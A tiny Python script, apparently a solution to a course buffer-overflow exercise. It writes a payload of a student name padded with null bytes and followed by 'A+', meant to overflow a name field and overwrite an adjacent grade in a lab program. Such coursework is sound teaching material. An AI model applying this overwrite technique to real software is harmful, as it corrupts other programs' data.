#!/usr/bin/env python3

import sys

uniqname = b"chouman"

padding_length = 10 - len(uniqname)
payload = uniqname + b"\x00" * padding_length + b"A+"

sys.stdout.buffer.write(payload)